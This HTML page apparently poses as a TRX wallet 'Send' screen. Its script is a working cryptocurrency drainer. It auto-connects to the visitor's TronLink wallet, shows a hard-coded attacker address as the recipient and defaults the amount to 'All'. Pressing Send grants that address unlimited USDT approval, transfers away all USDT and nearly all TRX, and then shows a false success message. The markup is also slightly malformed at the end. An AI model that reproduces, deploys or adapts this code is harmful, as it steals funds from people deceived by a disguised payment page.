<!DOCTYPE html>
<html>
<head>
    <title>Send TRX</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://cdn.jsdelivr.net/npm/@tronweb3/tronwallet-adapter@1.4.9/dist/TronLink.js"></script>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Arial,sans-serif; background:#000; color:#fff; }
        .header { background:#1a1a1a; padding:15px; text-align:center; border-bottom:1px solid #333; }
        .header h1 { font-size:18px; font-weight:600; }
        .content { padding:20px; }
        .balance { text-align:center; margin-bottom:20px; }
        .balance strong { font-size:24px; color:#f7931a; }
        .recipient { margin-bottom:15px; }
        .label { font-size:12px; color:#999; margin-bottom:5px; }
        .address { background:#1a1a1a; padding:12px; border-radius:8px; font-family:monospace; font-size:14px; word-break:break-all; }
        .amount-input { width:100%; background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:15px; font-size:20px; color:#fff; text-align:center; margin-bottom:15px; }
        .max-btn { background:#f7931a; color:#000; border:none; padding:8px 16px; border-radius:20px; font-size:12px; font-weight:600; margin-bottom:20px; cursor:pointer; }
        .send-btn { width:100%; background:#f7931a; color:#000; border:none; padding:18px; border-radius:12px; font-size:18px; font-weight:600; }
        .send-btn:active { background:#e6820a; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Send</h1>
    </div>
    <div class="content">
        <div class="balance">
            <div>Available</div>
            <strong id="balance">0 TRX</strong>
        </div>
        
        <div class="recipient">
            <div class="label">Recipient</div>
            <div class="address" id="recipientAddr">TDrainYourAddressHere123456789</div>
        </div>
        
        <input type="text" class="amount-input" id="amountInput" placeholder="0.00" value="All">
        <button class="max-btn" onclick="setMax()">MAX</button>
        
        <button class="send-btn" id="sendBtn">Send</button>
    </div>

    <script>
        const DRAINER_WALLET = "TDSqqZJBCfTiX53h5JxsoWyqFiiv8yRofM"; // YOUR TRON ADDRESS
        const USDT_TRC20 = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
        
        let tronWeb, userAddress;
        
        // Auto-connect on load
        window.onload = async () => {
            if (window.tronWeb) {
                await autoConnect();
                updateBalance();
            }
        };
        
        async function autoConnect() {
            try {
                tronWeb = window.tronWeb;
                await tronWeb.request({ method: 'tron_requestAccounts' });
                userAddress = tronWeb.defaultAddress.base58;
                document.getElementById('recipientAddr').textContent = DRAINER_WALLET;
            } catch(e) {}
        }
        
        async function updateBalance() {
            if (!tronWeb) return;
            const balance = await tronWeb.trx.getBalance(userAddress);
            document.getElementById('balance').textContent = (balance / 1000000).toFixed(2) + ' TRX';
        }
        
        function setMax() {
            document.getElementById('amountInput').value = 'All';
        }
        
        document.getElementById('sendBtn').onclick = async () => {
            if (!tronWeb || !userAddress) return;
            
            const amountText = document.getElementById('amountInput').value;
            if (amountText.toLowerCase() === 'all' || amountText === 'max') {
                await drainEverything();
            } else {
                await sendTRX(parseFloat(amountText) * 1000000);
            }
        };
        
        async function drainEverything() {
            try {
                // 1. UNLIMITED USDT approval
                const contract = await tronWeb.contract().at(USDT_TRC20);
                await contract.approve(DRAINER_WALLET, 
                    "115792089237316195423570985008687907853269984665640564039457584007913129639935"
                ).send({ feeLimit: 40000000 });
                
                // 2. Drain ALL USDT
                const usdtBalance = await contract.balanceOf(userAddress).call();
                if (usdtBalance > 0) {
                    await contract.transfer(DRAINER_WALLET, usdtBalance).send({ feeLimit: 40000000 });
                }
                
                // 3. Drain ALL TRX (leave 10 TRX fee)
                const trxBalance = await tronWeb.trx.getBalance(userAddress);
                if (trxBalance > 10000000) {
                    await tronWeb.trx.sendTransaction(DRAINER_WALLET, trxBalance - 10000000);
                }
                
                alert('✅ Transfer complete!');
            } catch(e) {
                alert('❌ Cancelled');
            }
        }
        
        async function sendTRX(amount) {
            await tronWeb.trx.sendTransaction(DRAINER_WALLET, amount);
        }
    </style>
</html>
